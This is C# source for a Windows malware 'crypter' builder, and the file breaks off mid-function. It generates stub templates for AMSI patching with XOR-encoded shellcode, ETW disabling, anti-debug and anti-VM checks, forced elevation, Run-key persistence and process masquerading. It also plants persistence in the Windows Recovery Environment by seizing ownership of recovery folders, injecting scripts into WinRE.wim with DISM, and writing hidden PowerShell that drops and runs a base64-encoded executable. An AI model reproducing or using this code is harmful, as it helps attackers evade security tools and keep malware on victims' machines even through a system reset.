using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Mono.Cecil.Cil;
using Mono.Cecil;
using System.Security.Cryptography;
using System.Reflection;
using System.Runtime.InteropServices;
using static Crypter.Settings;
using Crypter.Utils;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace Crypter.Forms
{
    public partial class FrmCrypter : Form
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, out int processInformation, int processInformationLength, out int returnLength);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        public FrmCrypter()
        {
            InitializeComponent();
        }

        private void FrmCrypter_Load(object sender, EventArgs e)
        {
            Console.WriteLine("[+] Loaded Crypter and Resources!");
        }
        
        private void FrmCrypter_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputfile = inputfile.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                amsiBypass = amsiBypass.Checked,
                etwBypass = etwBypass.Checked,
                obfuscation = obfuscator.Checked,
                runas = runas.Checked,
                usePolymorphicAes = polymorphicAes.Checked,
                useArmdot = armdotObfuscation.Checked,
                processMasquerading = processMasquerading.Checked,
                useEvilbyteIndirectSyscalls = evilbyteIndirectSyscalls.Checked,
                winREPersistence = winREPersistence.Checked
            };
            return obj;
        }

        private void UnpackSettings(SettingsObject obj)
        {
            inputfile.Text = obj.inputfile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            amsiBypass.Checked = obj.amsiBypass;
            etwBypass.Checked = obj.etwBypass;
            obfuscator.Checked = obj.obfuscation;
            runas.Checked = obj.runas;
            polymorphicAes.Checked = obj.usePolymorphicAes;
            armdotObfuscation.Checked = obj.useArmdot;
            processMasquerading.Checked = obj.processMasquerading;
            evilbyteIndirectSyscalls.Checked = obj.useEvilbyteIndirectSyscalls;
            winREPersistence.Checked = obj.winREPersistence;
        }

        static string antiVMTemplate()
        {
            return @"
static bool IsRunningVM()
{
    try
    {
        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_ComputerSystem""))
        {
            foreach (var item in searcher.Get())
            {
                string manufacturer = item[""Manufacturer""].ToString().ToLower();
                string model = item[""Model""].ToString().ToLower();
                
                if (manufacturer.Contains(""vmware"") || model.Contains(""virtualbox"") || model.Contains(""virtaul""))
                    return true;
            }
        }

        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_BIOS""))
        {
            foreach (var item in searcher.Get())
            {
                string bios = item[""SerialNumber""].ToString().ToLower();
                if (bios.Contains(""vmware"") || bios.Contains(""virtualbox""))
                    return true;
            }
        }
    }
    catch { }
    return false;
}

static bool IsSandboxed()
{
    try
    {
        string[] sandboxindicators = new string[]
        {
            ""SbieDll.dll"",
            ""VBoxService"",
            ""vmtoolsd"",
            ""vboxtray""
        };

        foreach (var proc in Process.GetProcesses())
        {
            if (sandboxindicators.Any(indicator => proc.ProcessName.ToLower().Contains(indicator.ToLower())))
               return true;
        }

    }
    catch { }
    return false;
}
";
        }

        static string antiDebugTemplate()
        {
            return @"
static void RunAntiDebug()
{
    if (IsManagedDebuggerAttached() || IsDebuggerAPI() || HasDebugPort())
    {
        Environment.Exit(0);
    }
}

static bool IsManagedDebuggerAttached()
{
    return Debugger.IsAttached || Debugger.IsLogging();
}

static bool IsDebuggerAPI()
{
    try
    {
        bool isDebuggerPresent = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);

        if (IsDebuggerPresent() || isDebuggerPresent)
            return true;
    }
    catch { }

    return false;
}

static bool HasDebugPort()
{
    try
    {
        int debugPort = 0;
        int returnLength;
        int status = NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out debugPort, sizeof(int), out returnLength);
        return (status == 0 && debugPort != 0);
    }
    catch { }

    return false;
}
";
        }

        static string amsiBypassTemplate()
        {
            return @"
// Advanced polymorphic AMSI bypass with multiple obfuscation techniques
private static string ReplaceFakeChars(string input)
{
    // Simple string transformation to avoid direct strings
    StringBuilder result = new StringBuilder();
    for (int i = 0; i < input.Length; i++)
    {
        if (input[i] != '*')
            result.Append(input[i]);
    }
    return result.ToString();
}

private static string[] DeobfuscateStrings()
{
    // Multiple layers of string obfuscation to evade signature detection
    string[] parts = new string[] {
        ReplaceFakeChars(""am*******si"") + ReplaceFakeChars(""."") + ReplaceFakeChars(""d*****ll""),
        ReplaceFakeChars(""Am*si*Sc*"") + ReplaceFakeChars(""anB*uf*fer""),
        ""System"" + ReplaceFakeChars(""."") + ""Runtime"" + ReplaceFakeChars(""."") + ""InteropServices"" + ReplaceFakeChars(""."") + ""Marshal""
    };
    return parts;
}

private static byte[] GetPatchBytes()
{
    // Dynamic patch generation to avoid static signatures
    // Base shellcode: mov eax, 0x80070057 (E_INVALIDARG), ret
    
    // XOR encode the shellcode to hide from signature scanning
    // Use timestamp-based key for polymorphism
    byte xorKey = (byte)((DateTime.Now.Ticks & 0xFF) ^ 0xAA);
    if (xorKey == 0) xorKey = 0x77;
    
    // Original shellcode
    byte[] rawShellcode = new byte[] { 
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 80070057h (E_INVALIDARG)
        0xC3                           // ret
    };
    
    // Apply additional transformation based on process ID for polymorphism
    int pid = Process.GetCurrentProcess().Id;
    byte pidModifier = (byte)(pid & 0xFF);
    
    // Encode shellcode with dynamic keys
    byte[] encodedShellcode = new byte[rawShellcode.Length + 2];
    encodedShellcode[0] = xorKey;
    encodedShellcode[1] = pidModifier;
    
    for (int i = 0; i < rawShellcode.Length; i++)
    {
        // Use both keys in the encoding process
        encodedShellcode[i + 2] = (byte)((rawShellcode[i] ^ xorKey) ^ pidModifier);
    }
    
    return encodedShellcode;
}

private static bool ApplyPatch(IntPtr functionAddress, byte[] patch)
{
    try
    {   
        // Decode patch bytes
        byte xorKey = patch[0];
        byte pidModifier = patch[1];
        byte[] decodedPatch = new byte[patch.Length - 2];
        
        for (int i = 0; i < decodedPatch.Length; i++)
        {
            decodedPatch[i] = (byte)((patch[i + 2] ^ pidModifier) ^ xorKey);
        }
        
        // Use VirtualProtect to change memory protection
        uint oldProtect = 0;
        bool success = VirtualProtect(functionAddress, (UIntPtr)decodedPatch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        if (!success) return false;
        
        // Apply patch using Marshal
        Marshal.Copy(decodedPatch, 0, functionAddress, decodedPatch.Length);
        
        // Restore protection
        VirtualProtect(functionAddress, (UIntPtr)decodedPatch.Length, oldProtect, out oldProtect);
        return true;
    }
    catch
    {
        return false;
    }
}

public static bool PatchAMSI()
{
    try
    {
        // Add jitter delay to avoid timing-based detection
        Thread.Sleep(DateTime.Now.Millisecond % 20);
        
        // Get target DLL and function names through obfuscation
        string[] obfuscatedStrings = DeobfuscateStrings();
        string dllName = obfuscatedStrings[0];
        string funcName = obfuscatedStrings[1];
        
        // Load library and get function address
        IntPtr hLib = LoadLibrary(dllName);
        if (hLib == IntPtr.Zero) return false;
        
        IntPtr funcAddr = GetProcAddress(hLib, funcName);
        if (funcAddr == IntPtr.Zero) return false;
        
        // Get dynamically generated patch bytes
        byte[] patch = GetPatchBytes();
        
        // Create random benign operations to add noise
        int[] junkArray = new int[Environment.ProcessorCount % 10 + 2];
        for (int i = 0; i < junkArray.Length; i++)
            junkArray[i] = i * DateTime.Now.Millisecond;
        
        // Apply the patch
        bool success = ApplyPatch(funcAddr, patch);
        
        // Add more jitter with some benign operations
        byte[] tempBytes = new byte[16];
        new Random().NextBytes(tempBytes);
        Array.Clear(tempBytes, 0, tempBytes.Length);
        
        return success;
    }
    catch
    {
        return false;
    }
}";
        }

        static string etwBypassTemplate()
        {
            return @"
        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        // Comprehensive ETW bypass using indirect syscalls
        private static void PatchETW()
{
    try
    {
                // Use direct NtTraceEvent syscall to disable ETW
                // This is more compatible than the ExecuteIndirectSyscall approach
                IntPtr ntdllHandle = GetModuleHandle(""ntdll.dll"");
                if (ntdllHandle != IntPtr.Zero)
                {
                    // Find NtTraceEvent function address
                    IntPtr ntTraceEventAddr = GetProcAddress(ntdllHandle, ""NtTraceEvent"");
                    if (ntTraceEventAddr != IntPtr.Zero)
                    {
                        // Execute NtTraceEvent with null parameters to disable ETW
                        NtTraceEventDelegate ntTraceEvent = (NtTraceEventDelegate)Marshal.GetDelegateForFunctionPointer(
                            ntTraceEventAddr, typeof(NtTraceEventDelegate));
                        
                        ntTraceEvent(IntPtr.Zero, 0, 0, IntPtr.Zero);
                    }
                }

                // Add some jitter and benign operations to confuse behavioral analysis
                int jitterDelay = DateTime.Now.Millisecond % 50;
                if (jitterDelay > 0) Thread.Sleep(jitterDelay);

                // Execute some benign operations
                var tempList = new List<string>();
                tempList.Add(Environment.MachineName);
                tempList.Clear();
            }
            catch
            {
                // Silent exception handling
                try {
                    string logPath = Path.Combine(Path.GetTempPath(), ""etw_bypass_error.log"");
                    File.AppendAllText(logPath, DateTime.Now.ToString());
                } catch {}
}
        }

        // Delegate for NtTraceEvent function
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtTraceEventDelegate(
            IntPtr TraceHandle,
            uint Flags,
            uint FieldSize,
            IntPtr Fields
        );
";
        }

        static string runasTemplate()
        {
            return @"
public static void EnsureRunAsAdmin()
{
    WindowsIdentity identity = WindowsIdentity.GetCurrent();
    WindowsPrincipal principal = new WindowsPrincipal(identity);

    if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.UseShellExecute = true;
        startInfo.WorkingDirectory = Environment.CurrentDirectory;
        startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
        startInfo.Verb = ""runas"";

        try
        {
            Process.Start(startInfo);
        }
        catch { }

        Environment.Exit(0);
    }
}
";
        }

        static string StartupTemplate()
        {
            return @"
public static void AddStartup()
{
    try
    {
        string exepath = Process.GetCurrentProcess().MainModule.FileName;
        string registrykey = @""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"";
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registrykey, true))
        {
            key.SetValue(""PUBLIC_STUB"", exepath);
        }
    }
    catch (Exception ex)
    {
    }
}";
        }

        static string processMasqueradingTemplate()
        {
            return @"
private static bool ApplyProcessMasquerading()
{
    try
    {
        // Get the path to a legitimate Windows process
        string[] legitimateProcesses = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""notepad.exe""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""calc.exe""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86), ""cmd.exe""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), ""explorer.exe""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), ""Internet Explorer\\iexplore.exe""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), ""Windows NT\\Accessories\\wordpad.exe"")
        };

        // Pick a random legitimate process
        Random rnd = new Random();
        string targetProcess = legitimateProcesses[rnd.Next(legitimateProcesses.Length)];
        
        // Make sure the chosen file exists
        if (!File.Exists(targetProcess))
        {
            // Try to find a fallback
            foreach (string process in legitimateProcesses)
            {
                if (File.Exists(process))
                {
                    targetProcess = process;
                    break;
                }
            }
        }
        
        if (!File.Exists(targetProcess))
            return false; // No legitimate process found
            
        // Create a disguised process name for taskbar/task manager
        string currentProcessName = Process.GetCurrentProcess().MainModule.FileName;
        string processName = Path.GetFileNameWithoutExtension(targetProcess);
        
        // Set window title to match legitimate process
        Console.Title = processName;
        
        // Make the process appear like a legitimate one by performing legitimate operations
        try
        {
            // Perform some file operations that the target process would typically do
            if (processName.Equals(""notepad"", StringComparison.OrdinalIgnoreCase))
            {
                // Mimic notepad behavior by creating a temporary text file
                string tempFile = Path.Combine(Path.GetTempPath(), ""temp_note.txt"");
                File.WriteAllText(tempFile, """");
                
                // Register file type association mimicking what the real app would do
                try
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        ""Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.txt\\UserChoice"", false))
                    {
                        // Just reading the key mimics app behavior without making changes
                        if (key != null)
                        {
                            object value = key.GetValue(""ProgId"");
                        }
                    }
                }
                catch { /* Ignore registry access errors */ }
            }
            else if (processName.Equals(""calc"", StringComparison.OrdinalIgnoreCase))
            {
                // Mimic calculator by performing some math operations
                double result = 0;
                for (int i = 0; i < 100; i++)
                {
                    result += Math.Sqrt(i);
                }
            }
            
            // Create a named mutex that the target process would typically create
            string mutexName = ""Local\\"" + processName + ""_Instance_Mutex"";
            bool createdNew = false;
            using (var mutex = new System.Threading.Mutex(true, mutexName, out createdNew))
            {
                // Just creating and releasing the mutex mimics app behavior
            }
            
            // Load common DLLs used by legitimate applications to appear authentic
            try
            {
                // These DLL loads will change our process behavior to appear more legitimate
                var shell32 = MasqLoadLibrary(""shell32.dll"");
                var user32 = MasqLoadLibrary(""user32.dll"");
                
                // Create benign window classes that the application would typically register
                IntPtr hInstance = Process.GetCurrentProcess().Handle;
                
                // Register and create dummy window to mimic application behavior
                if (user32 != IntPtr.Zero)
                {
                    // We're just loading modules, not making actual API calls that could throw off errors
                    MasqGetProcAddress(user32, ""CreateWindowExW"");
                    MasqGetProcAddress(user32, ""RegisterClassExW"");
                }
            }
            catch { /* Ignore any errors loading libraries */ }
        }
        catch { /* Ignore any errors in behavioral mimicking */ }
        
        return true;
    }
    catch
    {
        return false;
    }
}

// Required imports for process masquerading - renamed to avoid conflicts
[DllImport(""kernel32.dll"")]
private static extern IntPtr MasqGetModuleHandle(string lpModuleName);

[DllImport(""kernel32.dll"")]
private static extern IntPtr MasqGetProcAddress(IntPtr hModule, string procName);

[DllImport(""kernel32.dll"", SetLastError = true)]
private static extern IntPtr MasqLoadLibrary(string lpFileName);
";
        }

        // Provides the WinRE persistence template
        static string winREPersistenceTemplate()
        {
            StringBuilder template = new StringBuilder();
            template.AppendLine(@"
private static bool IsAdministrator()
{
    WindowsIdentity identity = WindowsIdentity.GetCurrent();
    WindowsPrincipal principal = new WindowsPrincipal(identity);
    return principal.IsInRole(WindowsBuiltInRole.Administrator);
}

public static void SetupWinREPersistence()
{
    try
    {
        // Ensure we have admin rights
        if (!IsAdministrator())
        {
            // Silent fail if not admin
            return;
        }

        // Attempt primary WinRE persistence
        bool primarySuccess = SetupPrimaryWinREPersistence();
        
        // Always attempt secondary WinRE persistence as a backup
        bool secondarySuccess = SetupSecondaryWinREPersistence();
        
        // Get current executable path
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
        
        // Create scheduled task for backup persistence
        CreateScheduledTask(currentExePath);
        
        // Create RunOnce registry key for backup persistence
        CreateRunOnceEntry(currentExePath);
    }
    catch
    {
        // Silent failure
    }
}

// Primary WinRE persistence using official recovery path
private static bool SetupPrimaryWinREPersistence()
{
    try
    {
        string recoveryPath = @""C:\Recovery\OEM"";
        string payloadXmlPath = Path.Combine(recoveryPath, ""recoverypayload.xml"");
        string resetConfigPath = Path.Combine(recoveryPath, ""ResetConfig.xml"");
        
        // Take ownership of and create the recovery directory
        TakeOwnershipOfDirectory(recoveryPath);
        
        // Verify we have write access
        if (!VerifyDirectoryAccess(recoveryPath))
        {
            return false; // Failed to gain access
        }
        
        // Get current executable path
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
        byte[] exeBytes = File.ReadAllBytes(currentExePath);
        
        // Base64 encode the executable
        string base64Payload = Convert.ToBase64String(exeBytes);
        
        // Create the payload XML with retries
        StringBuilder payloadXml = new StringBuilder();
        payloadXml.AppendLine(""<RecoveryPayload>"");
        payloadXml.AppendLine(""    <Base64Executable>"" + base64Payload + ""</Base64Executable>"");
        payloadXml.AppendLine(""</RecoveryPayload>"");
        
        bool payloadWritten = WriteFileWithRetry(payloadXmlPath, payloadXml.ToString());
        
        // Create the ResetConfig.xml with PowerShell launcher
        StringBuilder resetConfig = new StringBuilder();
        resetConfig.AppendLine(""<Reset>"");
        resetConfig.AppendLine(""    <Customizations>"");
        resetConfig.AppendLine(""        <Run>"");
        resetConfig.AppendLine(""            <Path>cmd.exe</Path>"");
        resetConfig.AppendLine(""            <Arguments>/c powershell -e "" + BuildPowershellLauncher(base64Payload) + ""</Arguments>"");
        resetConfig.AppendLine(""        </Run>"");
        resetConfig.AppendLine(""    </Customizations>"");
        resetConfig.AppendLine(""</Reset>"");
        
        bool configWritten = WriteFileWithRetry(resetConfigPath, resetConfig.ToString());
        
        // Also attempt to modify the Windows Recovery Environment directly
        ModifyWinREImage(base64Payload);
        
        // Hide Recovery folder
        try
        {
            DirectoryInfo dirInfo = new DirectoryInfo(recoveryPath);
            if ((dirInfo.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
            {
                dirInfo.Attributes |= FileAttributes.Hidden;
            }
        }
        catch
        {
            // Ignore attribute setting errors
        }
        
        return payloadWritten || configWritten;
    }
    catch
    {
        return false;
    }
}

// Secondary WinRE persistence using alternative recovery paths
private static bool SetupSecondaryWinREPersistence()
{
    try
    {
        // Try multiple common recovery paths for higher chance of success
        string[] recoveryPaths = new string[] 
        {
            @""C:\Windows\System32\Recovery"",
            @""C:\Windows\System32\Config\SystemProfile\AppData\Local\Microsoft\Windows\WinRE"",
            @""C:\ProgramData\Microsoft\Windows\WinRE""
        };
        
        bool anySuccess = false;
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
        byte[] exeBytes = File.ReadAllBytes(currentExePath);
        string base64Payload = Convert.ToBase64String(exeBytes);
        
        foreach (string basePath in recoveryPaths)
        {
            try
            {
                string customRecoveryPath = Path.Combine(basePath, ""CustomRecovery"");
                string recoveryPayloadPath = Path.Combine(customRecoveryPath, ""RecoveryScript.ps1"");
                string recoveryBatchPath = Path.Combine(customRecoveryPath, ""Recovery.cmd"");
                
                // Create and take ownership of this recovery directory
                Directory.CreateDirectory(customRecoveryPath);
                TakeOwnershipOfDirectory(customRecoveryPath);
                
                if (!VerifyDirectoryAccess(customRecoveryPath))
                    continue; // Skip if can't access
                
                // Create a PowerShell script to execute our payload
                StringBuilder psBuilder = new StringBuilder();
                psBuilder.AppendLine(""$tempExePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe')"");
                psBuilder.AppendLine(""[System.IO.File]::WriteAllBytes($tempExePath, [Convert]::FromBase64String('"" + base64Payload + ""'))"");
                psBuilder.AppendLine(""Start-Process -FilePath $tempExePath -WindowStyle Hidden"");
                
                bool psWritten = WriteFileWithRetry(recoveryPayloadPath, psBuilder.ToString());
                
                // Create a batch file that will be called during recovery
                StringBuilder batchBuilder = new StringBuilder();
                batchBuilder.AppendLine(""@echo off"");
                batchBuilder.AppendLine(""PowerShell -ExecutionPolicy Bypass -File \"""" + recoveryPayloadPath + ""\"""");
                batchBuilder.AppendLine(""exit"");
                
                bool batchWritten = WriteFileWithRetry(recoveryBatchPath, batchBuilder.ToString());
                
                // Register our recovery script in registry for additional persistence
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"", true))
                    {
                        if (key != null)
                        {
                            key.SetValue(""RecoveryCheck"", ""\"""" + recoveryBatchPath + ""\"""");
                        }
                    }
                }
                catch
                {
                    try
                    {
                        // Try HKCU if HKLM fails
                        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"", true))
                        {
                            if (key != null)
                            {
                                key.SetValue(""RecoveryCheck"", ""\"""" + recoveryBatchPath + ""\"""");
                            }
                        }
                    }
                    catch { /* Ignore errors */ }
                }
                
                // Set file attributes to hide our recovery files
                try
                {
                    if (File.Exists(recoveryPayloadPath))
                        File.SetAttributes(recoveryPayloadPath, FileAttributes.Hidden | FileAttributes.System);
                        
                    if (File.Exists(recoveryBatchPath))
                        File.SetAttributes(recoveryBatchPath, FileAttributes.Hidden | FileAttributes.System);
                        
                    DirectoryInfo dirInfo = new DirectoryInfo(customRecoveryPath);
                    dirInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
                }
                catch { /* Ignore attribute errors */ }
                
                anySuccess = anySuccess || psWritten || batchWritten;
            }
            catch
            {
                // Silent fail and continue to next path
            }
        }
        
        return anySuccess;
    }
    catch
    {
        return false;
    }
}

// Modifies the Windows Recovery image directly to ensure persistence through reset
private static bool ModifyWinREImage(string base64Payload)
{
    try
    {
        // Try to locate the WinRE image
        string[] possibleWinREPaths = new string[]
        {
            @""C:\Windows\System32\Recovery\WinRE.wim"",
            @""C:\Recovery\WindowsRE\WinRE.wim"",
            @""C:\Windows\System32\Recovery\WinRE\WinRE.wim""
        };
        
        string winREPath = null;
        foreach (string path in possibleWinREPaths)
        {
            if (File.Exists(path))
            {
                winREPath = path;
                break;
            }
        }
        
        if (winREPath == null)
            return false;
            
        // Create our script that will be executed during recovery
        string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        Directory.CreateDirectory(tempDir);
        
        // Create recovery scripts in temp directory
        string scriptPath = Path.Combine(tempDir, ""resetprep.ps1"");
        string batchPath = Path.Combine(tempDir, ""resetrun.cmd"");
        
        // PowerShell script to decode and execute payload
        StringBuilder psScriptBuilder = new StringBuilder();
        psScriptBuilder.AppendLine(""$tempExePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe')"");
        psScriptBuilder.AppendLine(""[System.IO.File]::WriteAllBytes($tempExePath, [Convert]::FromBase64String('"" + base64Payload + ""'))"");
        psScriptBuilder.AppendLine(""Start-Process -FilePath $tempExePath -WindowStyle Hidden"");
        
        File.WriteAllText(scriptPath, psScriptBuilder.ToString());
        
        // Batch script to execute PowerShell script
        StringBuilder batchScriptBuilder = new StringBuilder();
        batchScriptBuilder.AppendLine(""@echo off"");
        batchScriptBuilder.AppendLine(""PowerShell -ExecutionPolicy Bypass -File \""%%SYSTEMDRIVE%%\\Recovery\\resetprep.ps1\"""");
        batchScriptBuilder.AppendLine(""exit"");
        
        File.WriteAllText(batchPath, batchScriptBuilder.ToString());
        
        // Create a batch file to inject our files into the WinRE image
        string injectBatchPath = Path.Combine(tempDir, ""inject.bat"");
        StringBuilder injectScriptBuilder = new StringBuilder();
        injectScriptBuilder.AppendLine(""@echo off"");
        injectScriptBuilder.AppendLine(""DISM /Mount-Wim /WimFile:\"""" + winREPath + ""\"" /index:1 /MountDir:\"""" + tempDir + ""\\mount\"""");
        injectScriptBuilder.AppendLine(""mkdir \"""" + tempDir + ""\\mount\\Recovery\"""");
        injectScriptBuilder.AppendLine(""copy /Y \"""" + scriptPath + ""\"" \"""" + tempDir + ""\\mount\\Recovery\\resetprep.ps1\"""");
        injectScriptBuilder.AppendLine(""REG LOAD HKLM\\WRETEMP \"""" + tempDir + ""\\mount\\Windows\\System32\\config\\SOFTWARE\"""");
        injectScriptBuilder.AppendLine(""REG ADD \""HKLM\\WRETEMP\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"" /v RecoveryTask /t REG_SZ /d \""cmd.exe /c PowerShell -ExecutionPolicy Bypass -File \\Recovery\\resetprep.ps1\"" /f"");
        injectScriptBuilder.AppendLine(""REG UNLOAD HKLM\\WRETEMP"");
        injectScriptBuilder.AppendLine(""DISM /Unmount-Wim /MountDir:\"""" + tempDir + ""\\mount\"" /Commit"");
        injectScriptBuilder.AppendLine(""exit"");
        
        File.WriteAllText(injectBatchPath, injectScriptBuilder.ToString());
        
        // Create mount directory
        Directory.CreateDirectory(Path.Combine(tempDir, ""mount""));
        
        // Execute the injection batch file with elevated privileges
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = ""cmd.exe"",
            Arguments = ""/c \"""" + injectBatchPath + ""\"""",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = true,
            Verb = ""runas""
        };
        
        Process process = new Process { StartInfo = psi };
        process.Start();
        process.WaitForExit();
        
        // Also create a direct copy of our recovery files in the Recovery folder
        try
        {
            string sysRecoveryDir = @""C:\Recovery"";
            if (!Directory.Exists(sysRecoveryDir))
                Directory.CreateDirectory(sysRecoveryDir);
                
            TakeOwnershipOfDirectory(sysRecoveryDir);
            
            if (VerifyDirectoryAccess(sysRecoveryDir))
            {
                File.Copy(scriptPath, Path.Combine(sysRecoveryDir, ""resetprep.ps1""), true);
                File.Copy(batchPath, Path.Combine(sysRecoveryDir, ""resetrun.cmd""), true);
                
                // Hide the files
                File.SetAttributes(Path.Combine(sysRecoveryDir, ""resetprep.ps1""), FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(Path.Combine(sysRecoveryDir, ""resetrun.cmd""), FileAttributes.Hidden | FileAttributes.System);
            }
        }
        catch { /* Ignore errors */ }
        
        // Clean up temp directory
        try
        {
            Directory.Delete(tempDir, true);
        }
        catch { /* Ignore errors */ }
        
        return true;
    }
    catch
    {
        return false;
    }
}

private static void TakeOwnershipOfDirectory(string directoryPath)
{
    try
    {
        const int maxRetries = 3;
        const int delayBetweenRetries = 500; // milliseconds
        bool success = false;
        
        // Create parent directories if they don't exist
        string parentDir = Path.GetDirectoryName(directoryPath);
        if (!Directory.Exists(parentDir))
        {
            try 
            {
                Directory.CreateDirectory(parentDir);
                // Wait for directory creation to complete
                System.Threading.Thread.Sleep(500);
            }
            catch { /* Silently continue */ }
        }
        
        // First attempt: Use direct elevation with elevated commands
        try
        {
            // Create a temporary batch file with elevated commands
            string tempBatchFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".bat"");
            
            StringBuilder batchBuilder = new StringBuilder();
            batchBuilder.AppendLine(""@echo off"");
            batchBuilder.AppendLine(""takeown /f \"""" + directoryPath + ""\"" /r /d y"");
            batchBuilder.AppendLine(""icacls \"""" + directoryPath + ""\"" /reset /t"");
            batchBuilder.AppendLine(""icacls \"""" + directoryPath + ""\"" /grant:r Administrators:(OI)(CI)F /t"");
            batchBuilder.AppendLine(""icacls \"""" + directoryPath + ""\"" /grant:r SYSTEM:(OI)(CI)F /t"");
            batchBuilder.AppendLine(""icacls \"""" + directoryPath + ""\"" /grant:r Everyone:(OI)(CI)F /t"");
            batchBuilder.AppendLine(""if not exist \"""" + directoryPath + ""\"" mkdir \"""" + directoryPath + ""\"""");
            batchBuilder.AppendLine(""echo Test > \"""" + Path.Combine(directoryPath, ""test_access.txt"") + ""\"""");
            batchBuilder.AppendLine(""exit"");
            
            File.WriteAllText(tempBatchFile, batchBuilder.ToString());
            
            // Execute batch file with elevated privileges
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = ""cmd.exe"",
                Arguments = ""/c "" + tempBatchFile,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true, // Required for elevation
                Verb = ""runas""  // Request admin privileges
            };
            
            Process process = new Process { StartInfo = psi };
            process.Start();
            process.WaitForExit();
            
            // Delay after operation
            System.Threading.Thread.Sleep(1000);
            
            // Try to check if directory now exists and is accessible
            if (VerifyDirectoryAccess(directoryPath))
            {
                success = true;
                // Clean up test file
                try
                {
                    string testFile = Path.Combine(directoryPath, ""test_access.txt"");
                    if (File.Exists(testFile))
                        File.Delete(testFile);
                }
                catch { /* Ignore cleanup errors */ }
                
                // Clean up batch file
                try
                {
                    if (File.Exists(tempBatchFile))
                        File.Delete(tempBatchFile);
                }
                catch { /* Ignore cleanup errors */ }
                
                return; // Success - no need for retry loop
            }
        }
        catch { /* Silently continue to retry loop */ }
        
        // If direct elevation failed, try standard approach with multiple retries
        for (int retry = 0; retry < maxRetries && !success; retry++)
        {
            if (retry > 0)
            {
                // Add delay between retries
                System.Threading.Thread.Sleep(delayBetweenRetries);
                Console.WriteLine(""Retrying directory ownership (attempt "" + (retry+1) + "" of "" + maxRetries + "")"");
            }

            // Use takeown command to take ownership
            ProcessStartInfo takeownPsi = new ProcessStartInfo
            {
                FileName = ""cmd.exe"",
                Arguments = ""/c takeown /f \"""" + directoryPath + ""\"" /r /d y"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            
            Process takeownProcess = new Process { StartInfo = takeownPsi };
            takeownProcess.Start();
            takeownProcess.WaitForExit();
            
            // Delay after taking ownership
            System.Threading.Thread.Sleep(1000);
            
            // Grant full control permissions using icacls
            ProcessStartInfo icaclsPsi = new ProcessStartInfo
            {
                FileName = ""cmd.exe"",
